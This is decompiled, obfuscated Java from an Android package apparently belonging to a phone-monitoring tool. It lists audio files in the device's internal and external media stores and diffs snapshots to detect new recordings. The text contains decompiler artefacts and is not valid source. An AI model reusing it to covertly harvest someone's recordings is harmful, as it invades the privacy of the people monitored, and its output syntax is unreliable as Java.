package com.vvt.capture.audio.b;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.base.capture.g;
import com.vvt.capture.audio.AudioReference;
import com.vvt.capture.audio.b;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

public class f
  implements com.vvt.base.capture.f
{
  private static final boolean a = com.vvt.ak.a.a;
  private ContentResolver b;
  
  public f(ContentResolver paramContentResolver)
  {
    this.b = paramContentResolver;
  }
  
  public g a()
  {
    Object localObject1 = this.b;
    Object localObject2 = b.a;
    localObject1 = a.a((ContentResolver)localObject1, (Uri)localObject2);
    localObject2 = this.b;
    Object localObject3 = b.b;
    localObject2 = a.a((ContentResolver)localObject2, (Uri)localObject3);
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    localObject3 = new java/util/HashMap;
    ((HashMap)localObject3).<init>();
    ((HashMap)localObject3).put("external", localObject1);
    ((HashMap)localObject3).put("internal", localObject2);
    localObject1 = new com/vvt/capture/audio/AudioReference;
    ((AudioReference)localObject1).<init>();
    ((AudioReference)localObject1).setReference((HashMap)localObject3);
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = this.b;
    Object localObject3 = b.a;
    localObject2 = a.a((ContentResolver)localObject2, (Uri)localObject3, paramInt);
    localObject3 = this.b;
    Uri localUri = b.a;
    localObject2 = a.a((ContentResolver)localObject3, localUri, (List)localObject1, (List)localObject2);
    if (localObject2 != null)
    {
      int j = ((List)localObject2).size();
      if (j > 0)
      {
        boolean bool4 = a;
        if (bool4) {}
        localArrayList.addAll((Collection)localObject2);
      }
    }
    int k = ((List)localObject2).size();
    if (k < paramInt)
    {
      boolean bool5 = a;
      if (bool5) {}
      localObject3 = this.b;
      localUri = b.b;
      int i = ((List)localObject2).size();
      i = paramInt - i;
      localObject2 = a.a((ContentResolver)localObject3, localUri, i);
      localObject3 = this.b;
      localUri = b.b;
      localObject1 = a.a((ContentResolver)localObject3, localUri, (List)localObject1, (List)localObject2);
      if (localObject1 != null)
      {
        i = ((List)localObject1).size();
        if (i > 0)
        {
          boolean bool3 = a;
          if (bool3) {}
          localArrayList.addAll((Collection)localObject1);
        }
      }
    }
    boolean bool6 = a;
    if (bool6) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof AudioReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof AudioReference;
      if (bool1)
      {
        paramg1 = (AudioReference)paramg1;
        Object localObject1 = paramg1.getReference();
        paramg2 = (AudioReference)paramg2;
        Object localObject2 = paramg2.getReference();
        bool1 = a;
        if (bool1) {}
        List localList1 = (List)((HashMap)localObject1).get("internal");
        List localList2 = (List)((HashMap)localObject2).get("internal");
        ContentResolver localContentResolver = this.b;
        Uri localUri = b.b;
        localList1 = a.a(localContentResolver, localUri, localList1, localList2);
        if (localList1 != null)
        {
          int i = localList1.size();
          if (i > 0)
          {
            boolean bool2 = a;
            if (bool2) {}
            localArrayList.addAll(localList1);
          }
        }
        bool1 = a;
        if (bool1) {}
        localList1 = (List)((HashMap)localObject1).get("external");
        localList2 = (List)((HashMap)localObject2).get("external");
        localObject1 = this.b;
        localObject2 = b.a;
        localList1 = a.a((ContentResolver)localObject1, (Uri)localObject2, localList1, localList2);
        if (localList1 != null)
        {
          int j = localList1.size();
          if (j > 0)
          {
            boolean bool3 = a;
            if (bool3) {}
            localArrayList.addAll(localList1);
          }
        }
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/audio/removeFromPath/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */